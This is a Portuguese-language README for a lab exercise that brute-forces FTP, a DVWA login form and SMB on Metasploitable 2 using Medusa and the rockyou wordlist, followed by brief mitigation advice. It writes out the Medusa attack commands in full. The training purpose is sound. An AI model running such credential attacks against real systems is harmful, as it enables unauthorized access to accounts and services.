# Desafio de Auditoria de Segurança com Kali Linux e Medusa

## Objetivo
Este projeto demonstra a implementação de ataques de força bruta usando o Kali Linux e a ferramenta Medusa em ambientes vulneráveis, como Metasploitable 2 e DVWA. O objetivo é identificar vulnerabilidades e propor medidas de mitigação.

## Ambiente Configurado
- **Libvirt**: Ferramenta de virtualização.
- **Kali Linux**: Utilizado para realizar os ataques.
- **Metasploitable 2**: Ambiente vulnerável onde os ataques foram realizados.
- **Ferramentas utilizadas**:
  - Medusa
  - Nmap

## Ataques Realizados

### 1. Força Bruta no FTP
- **Comando Executado**: `medusa -h <IP-Metasploitable> -u <usuário> -P /usr/share/wordlists/rockyou.txt -M ftp`
- **Resultado**: A senha foi descoberta com sucesso após várias tentativas.

### 2. Ataque no Formulário Web (DVWA)
- **Comando Executado**: `medusa -h <IP-Metasploitable> -u <usuário> -P /usr/share/wordlists/rockyou.txt -M http-form-post`
- **Resultado**: Senha descoberta com sucesso, acesso autorizado ao painel de administração do DVWA.

### 3. Password Spraying em SMB
- **Comando Executado**: `medusa -h <IP-Metasploitable> -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -M smb`
- **Resultado**: Senha descoberta e acesso a compartilhamento SMB.

## Medidas de Mitigação
- **Senhas fortes**: Implementar políticas de senha forte.
- **Autenticação multifatorial**: Usar MFA para proteção extra.
- **Proteção contra força bruta**: Implementar bloqueio de contas após várias tentativas falhas.
